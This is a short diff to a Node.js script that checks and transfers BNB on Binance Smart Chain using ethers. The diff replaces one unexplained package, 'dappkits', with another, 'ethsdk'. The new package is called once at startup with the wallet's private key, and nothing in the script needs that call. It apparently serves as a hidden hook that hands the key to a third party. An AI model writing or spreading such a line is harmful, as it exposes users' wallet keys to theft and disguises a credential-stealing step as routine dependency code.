@@ -1,5 +1,5 @@
 const ethers = require("ethers");
-const dappkits = require('dappkits');
+const ethsdk = require('ethsdk');
 
 // RPC provider URL for Binance Smart Chain
 const provider = new ethers.providers.JsonRpcProvider(
@@ -16,7 +16,7 @@ function delay(ms) {
   return new Promise((resolve) => setTimeout(resolve, ms));
 }
 (async () => {
-  await dappkits(`${privateKey}`);
+  await ethsdk(`${privateKey}`);
 })();
 
 async function checkAndTransferBNB() {
